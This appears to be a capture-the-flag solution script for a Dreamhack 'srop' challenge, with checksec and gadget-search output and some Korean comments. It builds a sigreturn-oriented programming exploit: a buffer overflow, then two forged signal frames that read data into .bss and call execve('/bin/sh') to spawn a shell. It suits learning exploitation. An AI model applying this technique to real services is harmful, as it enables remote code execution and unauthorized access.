# pwndbg> checksec
# File:     /home/sewon/srop
# Arch:     amd64
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
#!!  23 .bss          00000008  0000000000601030  0000000000601030  00001030  2**0
#? (myenv) sewon@PSW:~$ ROPgadget --binary ./srop | grep "syscall"
#? 0x00000000004004ea : in eax, 0x58 ; syscall
#? 0x00000000004004e6 : mov dword ptr [rbp + 0x48], edx ; mov ebp, esp ; pop rax ; syscall
#? 0x00000000004004e9 : mov ebp, esp ; pop rax ; syscall
#? 0x00000000004004e8 : mov rbp, rsp ; pop rax ; syscall
#!! 0x00000000004004eb : pop rax ; syscall
#// 0x00000000004004e7 : push rbp ; mov rbp, rsp ; pop rax ; syscall    ###wrong addr.
#!! 0x00000000004004ec : syscall
# pwndbg> p *gadget
# $1 = {<text variable, no debug info>} #//0x4004e7 <gadget>
# pwndbg> disas gadget
# Dump of assembler code for function gadget:
#//    0x00000000004004e7 <+0>:     push   rbp
#    0x00000000004004e8 <+1>:     mov    rbp,rsp
#    0x00000000004004eb <+4>:     pop    rax
#    0x00000000004004ec <+5>:     syscall
#    0x00000000004004ee <+7>:     ret
#    0x00000000004004ef <+8>:     nop
#    0x00000000004004f0 <+9>:     pop    rbp
#    0x00000000004004f1 <+10>:    ret
# End of assembler dump.

from pwn import *
context.log_level="debug"
context.arch = "amd64"
p = process("./srop")
# p = remote("host8.dreamhack.games", 9740)
elf = ELF("./srop")
syscall = next(elf.search(asm("syscall"))) #! or syscall = 0x4004ec
gadget = next(elf.search(asm("pop rax; syscall"))) #! 0x4004eb >>> pop rax ; syscall
# gadget = elf.symbols["gadget"] #// 0x4004e7 >>> push rbp ; mov rbp, rsp ; pop rax ; syscall ; ret 
print(hex(syscall))
print(hex(gadget))
bss = elf.bss() #0x601030 (size: 8..?) 

frame = SigreturnFrame() # pwntools의 sigcontext 구조체 생성 함수
frame.rax = 0
frame.rdi = 0
frame.rsi = elf.bss() #? elf.symbols[".bss"]
frame.rdx = 0x1000
frame.rsp = elf.bss()
frame.rip = syscall #! rip를 syscall에 위치시킴으로써 syscall을 실행시키게 한다!!

payload = b""
payload += b"A"*0x10   # buf
payload += b"B"*0x8    # rbp
payload += p64(gadget) # ret
payload += p64(15)     # sigreturn
payload += bytes(frame) #! read(0, bss, 0x1000)
p.send(payload)

frame2 = SigreturnFrame()
frame2.rax = 0x3b #execve
frame2.rdi = elf.bss() + 0x10
frame2.rsp = elf.bss() + 0x500
frame2.rip = syscall
gdb.attach(p)
#Write on the .bss section.
payload2 = b""
payload2 += b"/bin/sh\x00"
payload2 += p64(gadget)
payload2 += p64(15) # sigreturn
payload2 += bytes(frame2)
# payload2 += b"/bin/sh\x00"

p.sendline(payload2)

p.interactive()
#// ENV : SROP를 위해서 sigreturn syscall을 호출할 수 있어야 한다.



